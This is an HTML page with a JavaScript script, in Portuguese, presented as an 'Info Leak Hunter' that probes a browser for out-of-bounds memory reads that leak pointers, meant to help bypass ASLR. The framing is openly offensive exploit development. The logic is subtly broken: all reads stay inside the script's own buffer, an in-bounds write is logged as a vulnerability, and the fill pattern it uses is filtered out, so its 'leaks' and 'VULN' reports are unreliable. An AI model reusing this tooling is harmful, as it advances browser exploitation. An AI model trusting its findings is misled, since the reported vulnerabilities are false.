<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Info Leak Hunter (Focado em ASLR Bypass)</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output {
            background: #222;
            border: 1px solid #444;
            padding: 10px;
            height: 85vh;
            overflow-y: auto;
            white-space: pre-wrap;
            margin-top: 10px;
        }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-vuln { color: #ff4444; font-weight: bold; }
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
        .log-critical { color: #f0f; font-weight: bold; }
        .log-leak { color: #FF9800; font-weight: bold; }
        .log-ptr { color: #f0f; font-weight: bold; }
        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
    </style>
</head>
<body>
    <h1>Info Leak Hunter (Focado em ASLR Bypass)</h1>
    <p>Tenta encontrar um vazamento de ponteiro Out-Of-Bounds para auxiliar no bypass do ASLR.</p>
    <button id="runBtn" onclick="runInfoLeakTest()">Iniciar Teste de Info Leak</button>
    <div id="output"></div>

    <script>
        const outputDiv = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const SHORT_PAUSE = 50; // Pausa curta em milissegundos
        let leakedValueFromOOB = null; // Armazenará o melhor leak encontrado

        const log = (message, type = 'info', funcName = '') => {
            if (!outputDiv) return;
            try {
                const timestamp = `[${new Date().toLocaleTimeString()}]`;
                const prefix = funcName ? `[${funcName}] ` : '';
                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                // Simplificando classes de log para este script focado
                const logClass = ['vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';

                if(outputDiv.innerHTML.length > 800000){ // Aumentar um pouco o buffer de log
                    outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 400000);
                    outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML;
                }

                outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
                outputDiv.scrollTop = outputDiv.scrollHeight;
            } catch(e) {
                console.error("Erro no logging:", e);
                if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
            }
        };

        const PAUSE_S1 = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
        const toHex = (val, bits = 32) => {
            if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
            let num = Number(val);
            if (bits <= 32) { num = num >>> 0; } // Forçar para Unsigned 32-bit se necessário
            const pad = Math.ceil(bits / 4);
            return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
        };

        const attemptOOBLeak = async () => {
            const FNAME = 'attemptOOBLeak';
            log("--- Iniciando Tentativa de Vazamento OOB ---", 'test', FNAME);

            // --- Parâmetros Configuráveis ---
            const bufferSize = 32;       // Tamanho base do buffer interno que tentamos ler/escrever OOB
            const oobWriteOffset = bufferSize; // Onde tentar a escrita OOB (logo após nosso bufferSize)
            const writeValue = 0xEE;     // Valor para a escrita OOB

            // Intervalos de varredura de leitura OOB. Ajuste com CUIDADO!
            const readRangeStart = -128;  // Quão "antes" do buffer alvo começar a ler
            const readRangeEnd = bufferSize + 128; // Quão "depois" do buffer alvo terminar a leitura

            const allocationSize = bufferSize + 256 + Math.abs(readRangeStart); // Tamanho total do ArrayBuffer a ser alocado.
                                                                           // Precisa ser grande o suficiente para cobrir baseOffset + readRangeEnd
                                                                           // e baseOffset + readRangeStart.
            const baseOffsetInBuffer = Math.abs(readRangeStart) + 64; // Onde nosso "bufferSize" conceitual realmente começa dentro da alocação.
                                                               // Deve ser > Math.abs(readRangeStart)
            // --- Fim dos Parâmetros Configuráveis ---


            const oobReadOffsets = [];
            // Gerar offsets para leituras de 4 em 4 bytes
            for (let i = readRangeStart; i < readRangeEnd; i += 4) {
                oobReadOffsets.push(i);
            }
            // Adicionar offsets byte a byte em uma sub-região crítica (ajuste conforme necessário)
            const byteReadStart = -32;
            const byteReadEnd = bufferSize + 32;
            for (let i = byteReadStart; i < byteReadEnd; i++) {
                if (!oobReadOffsets.includes(i)) {
                    oobReadOffsets.push(i);
                }
            }
            oobReadOffsets.sort((a, b) => a - b); // Ordenar para uma varredura lógica

            let writeSuccess = false;
            let potentialLeakFoundCount = 0;
            leakedValueFromOOB = null; // Resetar a variável global de leak

            const isSanePointerCandidate64 = (high, low, addressReadFrom) => {
                if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
                if (high === 0 && low === 0) return false;
                if ((high === 0xFFFFFFFF && low === 0xFFFFFFFF) || (high === 0 && low === 0xFFFFFFFF) ) return false;
                if ((high === 0xAAAAAAAA && low === 0xAAAAAAAA) || (high === 0 && low === 0xAAAAAAAA) ) return false;
                if ((high === 0xABABABAB && low === 0xABABABAB) || (high === 0 && low === 0xABABABAB) ) return false;
                if ((high === 0xCDCDCDCD && low === 0xCDCDCDCD) || (high === 0 && low === 0xCDCDCDCD) ) return false;
                if ((high === 0xDDDDDDDD && low === 0xDDDDDDDD) || (high === 0 && low === 0xDDDDDDDD) ) return false;
                if ((high === 0xBBBBBBBB && low === 0xBBBBBBBB) || (high === 0 && low === 0xBBBBBBBB) ) return false; // Nosso fill pattern


                // Ajuste MAX_EXPECTED_USER_HIGH conforme necessário para seu alvo!
                // Este é um valor crítico para filtrar ponteiros de kernel ou inválidos.
                const MAX_EXPECTED_USER_HIGH = 0x00007FFF; // Ex: para Linux/Windows/macOS userspace 64-bit
                // const MAX_EXPECTED_USER_HIGH = 0x000FFFFF; // Exemplo um pouco mais permissivo
                // const MIN_EXPECTED_USER_HIGH = 0x00000001; // Se houver módulos carregados em endereços muito altos mas ainda userspace

                if (high > MAX_EXPECTED_USER_HIGH /*|| (high === 0 && low < 0x100000 && low > 0)*/ ) { // A segunda parte pode ser muito restritiva
                    // log(` -> PTR? U64 H=${toHex(high)} L=${toHex(low)} DESCARTADO (High DWord suspeito)`, 'info', FNAME);
                    return false;
                }
                // Para ponteiros de 64 bits, o DWord alto não ser zero é um bom sinal, a menos que o alvo use endereços < 4GB extensivamente.
                // if (high === 0 && low > 0x10000) { /* Pode ser um ponteiro válido de 32 bits em um sistema de 64, ou um objeto em uma arena de 32 bits */ }


                // Evitar ponteiros para endereços muito baixos (geralmente não são código/heap útil)
                if (high === 0 && low < 0x10000) return false; // Abaixo de 64KB

                // Opcional: Verificação de alinhamento do *endereço de onde se lê* o ponteiro.
                // Ponteiros *em si* (o valor high:low) podem não ser alinhados, mas o local onde são armazenados frequentemente é.
                // if (addressReadFrom % 4 !== 0) return false; // Mínimo alinhamento de 4 bytes. Para U64, % 8 seria mais rigoroso.

                return true;
            };

            const isSaneDataCandidate32 = (val32) => {
                if (val32 === null || typeof val32 !== 'number') return false;
                val32 = val32 >>> 0;
                if (val32 === 0 || val32 === 0xFFFFFFFF || val32 === 0xAAAAAAAA || val32 === 0xABABABAB || val32 === 0xCDCDCDCD || val32 === 0xDDDDDDDD || val32 === 0xBBBBBBBB) return false;
                if (val32 < 0x1000) return false; // Dados muito pequenos
                return true;
            };

            try {
                const buffer = new ArrayBuffer(allocationSize);
                const dataView = new DataView(buffer);
                for (let i = 0; i < buffer.byteLength; i++) {
                    dataView.setUint8(i, 0xBB); // Preencher com padrão conhecido
                }

                const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset;
                await PAUSE_S1();

                try {
                    dataView.setUint8(writeTargetAddress, writeValue);
                    log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${toHex(writeTargetAddress)}) OK! Val=${toHex(writeValue, 8)}`, 'vuln', FNAME);
                    writeSuccess = true;
                } catch (e) {
                    log(`Escrita OOB U8 @${oobWriteOffset} (addr ${toHex(writeTargetAddress)}) FALHOU/Bloqueada: ${e.message}`, 'good', FNAME);
                    // Continuar mesmo se a escrita falhar, pois a leitura OOB pode ser independente.
                }
                await PAUSE_S1();

                log(`Iniciando varredura de leitura OOB de ${readRangeStart} até ${readRangeEnd} (relativo ao buffer interno). Total offsets: ${oobReadOffsets.length}`, 'info', FNAME);

                for (const readOffset of oobReadOffsets) {
                    const currentReadTargetAddress = baseOffsetInBuffer + readOffset; // Endereço absoluto dentro do ArrayBuffer
                    const relOffsetStr = `@${readOffset} (abs addr in buffer: ${toHex(currentReadTargetAddress)})`;

                    // Tentar ler como U64 (prioridade)
                    if (currentReadTargetAddress >= 0 && (currentReadTargetAddress + 8) <= buffer.byteLength) {
                        try {
                            const low = dataView.getUint32(currentReadTargetAddress, true);
                            const high = dataView.getUint32(currentReadTargetAddress + 4, true);

                            if (isSanePointerCandidate64(high, low, currentReadTargetAddress)) {
                                const vStr = `H=${toHex(high)} L=${toHex(low)}`;
                                log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME);
                                potentialLeakFoundCount++;

                                // Priorizar U64 sobre U32 já encontrado, ou se nenhum leak foi encontrado ainda
                                if (leakedValueFromOOB === null || leakedValueFromOOB.type === 'U32') {
                                    leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset, addressReadFrom: currentReadTargetAddress };
                                    log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME);
                                    log(` ---> *** ALERTA: Potencial Ponteiro U64 Vazado! ***`, 'escalation', FNAME);
                                    log(` ---> INSIGHT: Analisar ${vStr} para ASLR bypass.`, 'info', FNAME);
                                }
                            }
                        } catch (e) { /* Erros de leitura OOB são esperados e geralmente ignorados */ }
                    }

                    // Tentar ler como U32 (se nenhum U64 promissor foi encontrado ainda)
                    if (leakedValueFromOOB === null || leakedValueFromOOB.type !== 'U64') { // Evitar sobrescrever um U64 com um U32
                        if (currentReadTargetAddress >= 0 && (currentReadTargetAddress + 4) <= buffer.byteLength) {
                            try {
                                const val32 = dataView.getUint32(currentReadTargetAddress, true);
                                if (isSaneDataCandidate32(val32)) {
                                    // Só armazenar U32 se nenhum U64 tiver sido armazenado ou se o U32 atual for diferente
                                    if (leakedValueFromOOB === null || (leakedValueFromOOB.type === 'U32' && leakedValueFromOOB.low !== val32) ) {
                                        log(` -> Leak U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME);
                                        potentialLeakFoundCount++;
                                        leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset, addressReadFrom: currentReadTargetAddress };
                                        log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME);
                                    }
                                }
                                if (readOffset === oobWriteOffset && (val32 & 0xFF) === writeValue) {
                                    log(` -> Leu parte do valor OOB escrito (${toHex(val32)}) ${relOffsetStr}.`, 'good', FNAME);
                                }
                            } catch (e) { /* Erros de leitura OOB são esperados */ }
                        }
                    }
                    if (readOffset % 64 === 0) await PAUSE_S1(5); // Pausa um pouco maior para UI e evitar busy-loop intenso
                }

            } catch (e) {
                log(`Erro FATAL na tentativa de leak OOB: ${e.message}`, 'critical', FNAME);
                console.error(e);
            } finally {
                let leakStatus = 'Nenhum valor promissor armazenado.';
                if (leakedValueFromOOB) {
                    leakStatus = `Melhor leak: ${leakedValueFromOOB.type} @${leakedValueFromOOB.offset} ` +
                                 `(Lido de buf addr ${toHex(leakedValueFromOOB.addressReadFrom)}) ` +
                                 (leakedValueFromOOB.type === 'U64' ? `H=${toHex(leakedValueFromOOB.high)} L=${toHex(leakedValueFromOOB.low)}` : `Val=${toHex(leakedValueFromOOB.low)}`);
                }
                log(`--- Tentativa de Vazamento OOB Concluída (${potentialLeakFoundCount} leaks potenciais?, ${leakStatus}) ---`, 'test', FNAME);
                if (leakedValueFromOOB && leakedValueFromOOB.type === 'U64') {
                    log(`POTENCIAL PONTEIRO PARA ANÁLISE ASLR: H=${toHex(leakedValueFromOOB.high)} L=${toHex(leakedValueFromOOB.low)}`, 'CRITICAL', FNAME);
                } else if (leakedValueFromOOB) {
                    log(`Leak U32 para análise: ${toHex(leakedValueFromOOB.low)}`, 'LEAK', FNAME);
                } else {
                    log("Nenhum ponteiro ou dado promissor foi vazado nesta execução.", 'warn', FNAME);
                }
            }
            return leakedValueFromOOB !== null;
        };

        const runInfoLeakTest = async () => {
            if (runBtn) runBtn.disabled = true;
            outputDiv.innerHTML = ''; // Limpar output ao iniciar
            log("==== INICIANDO Info Leak Hunter ====", 'test', 'runInfoLeakTest');

            await attemptOOBLeak();

            log("\n==== Info Leak Hunter CONCLUÍDO ====", 'test', 'runInfoLeakTest');
            if (runBtn) runBtn.disabled = false;
        };
    </script>
</body>
</html>
